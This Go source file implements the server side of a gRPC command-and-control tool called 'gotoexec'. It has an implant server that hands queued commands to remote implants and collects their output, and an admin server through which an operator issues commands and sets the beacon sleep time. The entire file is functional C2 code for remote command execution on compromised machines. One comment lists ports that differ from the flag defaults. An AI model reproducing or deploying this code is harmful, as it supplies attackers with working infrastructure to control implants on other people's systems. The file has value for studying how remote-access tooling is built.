package main

import (
	"context"
	"errors"
	"flag"
	"fmt"
	"google.golang.org/grpc"
	"gotoexec/grpcapi"
	"gotoexec/util"
	"log"
	"net"
)

var sleepTime int32 = 3

type implantServer struct {
	work, output chan *grpcapi.Command
}

type adminServer struct {
	work, output chan *grpcapi.Command
}

func NewImplantServer (work, output chan *grpcapi.Command) *implantServer {
	s := new(implantServer)
	s.work = work
	s.output = output
	return  s
}
func NewAdminServer (work, output chan *grpcapi.Command) *adminServer {
	s := new(adminServer)
	s.work = work
	s.output = output
	return  s
}

func (s *implantServer) FetchCommand(ctx context.Context, empty *grpcapi.Empty) (*grpcapi.Command, error) {
	var cmd = new(grpcapi.Command)
	select {
	case cmd, ok := <-s.work:
		if ok {
			return cmd, nil
		}
		return cmd, errors.New("channel closed")
	default:
		return cmd, nil
	}
}
func (s *implantServer) SendOutput (ctx context.Context, result *grpcapi.Command) (*grpcapi.Empty, error) {
	s.output <- result
	fmt.Println("result:" + result.In + result.Out)
	return &grpcapi.Empty{}, nil
}
func (s *implantServer) GetSleepTime(ctx context.Context, empty *grpcapi.Empty) (*grpcapi.SleepTime, error) {
	time := new(grpcapi.SleepTime)
	time.Time = sleepTime
	return time,nil
}



func (s *adminServer) RunCommand(ctx context.Context, cmd *grpcapi.Command) (*grpcapi.Command, error)  {
	fmt.Println(cmd.In)
	var res *grpcapi.Command
	go func() {
		s.work <- cmd
	}()

	res = <- s.output

	return res, nil
}
func (s *adminServer) SetSleepTime(ctx context.Context, time *grpcapi.SleepTime) (*grpcapi.Empty, error) {
	sleepTime = time.Time
	return &grpcapi.Empty{}, nil
}


func main()  {
	util.Banner()
	var (
		implantListener, adminListener net.Listener
		err 					   error
		opts					   []grpc.ServerOption
		work, output			   chan *grpcapi.Command
		implantPort, adminPort     int
	)
	flag.IntVar(&implantPort,"iport",1961,"Implant server port")
	flag.IntVar(&adminPort,"aport",1962,"Admin server port")
	flag.Parse()
	work, output = make(chan *grpcapi.Command), make(chan *grpcapi.Command)
	//植入程序服务端和管理程序服务端使用相同的通道
	implant := NewImplantServer(work, output)
	admin := NewAdminServer(work, output)
	//服务端建立监听，植入服务端与管理服务端监听的端口分别是4001和4002
	if implantListener,err = net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", implantPort)); err != nil {
		log.Fatalln("implantserver"+err.Error())
	}
	if adminListener,err = net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", adminPort)); err != nil {
		log.Fatalln("adminserver"+err.Error())
	}
	opts = []grpc.ServerOption{
		grpc.MaxRecvMsgSize(1024*1024*12),
		grpc.MaxSendMsgSize(1024*1024*12),
	}
		grpcAdminServer, grpcImplantServer := grpc.NewServer(opts...), grpc.NewServer(opts...)

	grpcapi.RegisterImplantServer(grpcImplantServer, implant)
	grpcapi.RegisterAdminServer(grpcAdminServer, admin)
	//使用goroutine启动植入程序服务端，防止代码阻塞，毕竟后面还要开启管理程序服务端
	go func() {
		grpcImplantServer.Serve(implantListener)
	}()
	grpcAdminServer.Serve(adminListener)
}
























